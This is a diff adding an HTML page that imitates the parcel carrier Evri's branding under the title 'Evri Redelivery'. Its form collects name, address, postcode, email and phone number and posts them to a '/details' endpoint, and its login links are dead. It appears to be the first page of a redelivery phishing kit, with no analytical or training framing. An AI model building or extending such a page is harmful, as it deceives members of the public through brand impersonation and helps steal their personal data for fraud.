@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Evri Redelivery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { background: #e9f5f3; font-family: Arial, sans-serif; margin:0;}
+    .evri-bar {background: #007bc4; color: #fff; display:flex; align-items:center; justify-content:space-between; padding: 0 18px; height:53px;}
+    .evri-logo-bar {display:flex; align-items:center;}
+    .evri-logo-text { font-weight:900; letter-spacing:1px; font-size:22px; }
+    .evri-delivery { font-size:13px; margin-left:7px; color:#fff; opacity: 0.9;}
+    .evri-links a {color:#fff; text-decoration:none; margin-left:26px; font-size:15px; font-weight:600;}
+    .evri-links a:hover {text-decoration:underline;}
+    .form-outer {min-height: calc(100vh - 53px); display:flex; justify-content:center; align-items:center;}
+    .form-card {
+      background: #fff; max-width: 330px; width:100%;
+      border-radius: 13px; box-shadow:0 4px 26px #cde6ef;
+      padding: 26px 23px 21px 23px; margin: 38px 8px;
+      display:flex; flex-direction:column; align-items:stretch;
+    }
+    .logo-center { width: 80px; display: block; margin: 0 auto 13px auto;}
+    .form-card-title {color:#23264c; font-weight: bold; font-size: 21px; margin-bottom: 13px; text-align:center; letter-spacing: -0.5px;}
+    .form-group { margin-bottom: 12px;}
+    label { color:#2c3552; font-size: 15px; font-weight: 600; display:block; margin-bottom: 4px; letter-spacing:0.1px; }
+    input[type="text"], input[type="email"], input[type="tel"] {
+      width: 100%; padding: 9px 12px; border-radius: 5px; border: 1.2px solid #c6e0ec; background: #f8fbfd; font-size:15px;
+      box-sizing:border-box; transition: border 0.2s;
+    }
+    input:focus { outline: none; border: 1.2px solid #007bc4; background: #f4fbff; }
+    .form-card button { font-size: 16px; font-weight:700; letter-spacing:0.5px; background: #172670; color: #fff; padding: 10px 0; border: none; border-radius: 17px; cursor:pointer; width: 100%; margin-top: 12px; box-shadow: 0 1px 4px #e0e0ef; transition: background 0.18s;}
+    .form-card button:hover {background: #007bc4;}
+    @media (max-width: 480px){ .form-card { margin: 14px 0; border-radius:0; box-shadow:none; padding:13px 4vw 13px 4vw; max-width:95vw;} .evri-logo-bar .evri-logo-text { font-size:17px; } .evri-bar {font-size:14px;} }
+  </style>
+</head>
+<body>
+  <div class="evri-bar">
+    <div class="evri-logo-bar">
+      <span class="evri-logo-text">EVRi</span>
+      <span class="evri-delivery">delivery made for you</span>
+    </div>
+    <div class="evri-links">
+      <a href="#">Log In</a>
+      <a href="#">Sign Up</a>
+    </div>
+  </div>
+  <div class="form-outer">
+    <form class="form-card" action="/details" method="POST" autocomplete="off">
+      <img src="evri-logo.png" alt="Evri" class="logo-center">
+      <div class="form-card-title">Redelivery</div>
+      <div class="form-group">
+        <label>First Name</label>
+        <input type="text" name="firstName" required>
+      </div>
+      <div class="form-group">
+        <label>Last Name</label>
+        <input type="text" name="lastName" required>
+      </div>
+      <div class="form-group">
+        <label>First Line of Address</label>
+        <input type="text" name="addr1" required>
+      </div>
+      <div class="form-group">
+        <label>Second Line of Address</label>
+        <input type="text" name="addr2">
+      </div>
+      <div class="form-group">
+        <label>Postcode</label>
+        <input type="text" name="postcode" required>
+      </div>
+      <div class="form-group">
+        <label>Email</label>
+        <input type="email" name="email" required>
+      </div>
+      <div class="form-group">
+        <label>Phone Number</label>
+        <input type="tel" name="phone" required>
+      </div>
+      <button type="submit">Next</button>
+    </form>
+  </div>
+</body>
+</html>
+
+
+
+
+
